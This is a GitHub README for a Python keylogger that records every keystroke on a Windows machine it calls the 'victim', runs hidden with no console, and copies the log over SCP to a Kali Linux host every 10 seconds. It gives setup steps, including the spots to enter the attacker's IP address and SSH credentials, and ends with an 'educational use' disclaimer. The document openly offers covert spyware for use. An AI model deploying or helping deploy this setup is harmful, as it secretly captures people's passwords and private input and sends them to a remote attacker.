# 🔐 Keylogger Project

A **Python-based keylogger** developed for **educational and research** purposes only. This tool captures keystrokes on a Windows machine and securely transfers the logs to a Kali Linux system using **SSH/SCP**.

---

## ✨ Features

- ✅ Logs all keystrokes to `keystrokes.log`
- 🚀 Automatically transfers the log to a Kali Linux host every 10 seconds
- 🛡️ Runs silently in the background (no visible console)
- 🧵 Multi-threaded design for smooth performance

---

## ⚙️ Prerequisites

### 🔸 On Windows setup (victim)

- [Python 3.x](https://www.python.org/downloads/)



🚀 Setup Instructions
Clone the repository

`git clone https://github.com/dhafin5858/keylogger.git`

`cd keylogger`

Edit keylogger_service.pyw and update these variables:

`kali_ip = "192.168.18.150"  # Your Kali Linux or VPS IP`

`username = "kali"           # Your SSH username`

`password = "kali"           # Your SSH password`

Install requirements

`pip install -r requirements.txt`

🟢 Starting the keylogger
simply double click the `keylogger_service.pyw`

  
🔸 On Kali Linux all keylogger transfered to (host)

SSH Server must be active:

`sudo apt install openssh-server`




🛑 Stopping the Keylogger

To terminate the keylogger, open Task Manager and manually end the python.exe process.

📌 How It Works
🔤 Keystroke Logging
Captures all keyboard input and appends it to a file named keystrokes.log.

📤 Periodic Log Transfer
Every 10 seconds, the file is securely transferred to the Kali Linux host using SCP over SSH.

🕶 Background Execution
When run with pythonw, the script executes silently (without opening a console window), making it ideal for automated testing or stealthy demonstrations.


⚠️ Disclaimer
This project is intended for ethical and educational use only.
Do not deploy this tool without the explicit consent of all parties involved.
Misuse can result in severe legal consequences.
